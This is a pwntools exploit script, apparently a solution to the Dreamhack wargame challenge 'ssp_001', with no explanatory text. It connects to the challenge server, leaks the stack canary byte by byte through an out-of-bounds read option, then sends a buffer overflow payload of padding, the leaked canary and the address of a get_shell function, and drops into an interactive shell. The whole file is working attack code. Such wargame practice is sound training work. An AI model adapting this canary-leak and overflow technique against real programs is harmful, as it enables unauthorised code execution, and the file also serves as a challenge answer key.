from pwn import *

# p = process('./ssp_001')
# nc host1.dreamhack.games 23569
p = remote('host1.dreamhack.games', 23569)
context.arch = 'i386'
context.log_level = 'debug'

get_shell = 0x80486b9

p.sendafter("> ", "P")
p.recvuntil("x : ")
p.sendline("129")
p.recvuntil("is : ")
print(p.recv(2))


input()
can_index = "132"
canary = b"0x"
for i in range(4):
    can_index = str(int(can_index, 10) - 1)
    print(can_index)
    p.sendafter('> ', 'P')
    p.recvuntil("x : ")
    p.sendline(can_index)
    p.recvuntil("is : ")
    canary = canary + p.recv(2)
    print(hex(int(canary, 16)))

canary = int(canary, 16)

pay = b""
pay += b"A" * 0x40
pay += p32(canary) #canary
pay += b"X" * 8
pay += p32(get_shell)

p.sendafter('> ', 'E')
p.recvuntil("ze : ")
p.sendline("1024")
p.recvuntil("me : ")
p.send(pay)


p.interactive()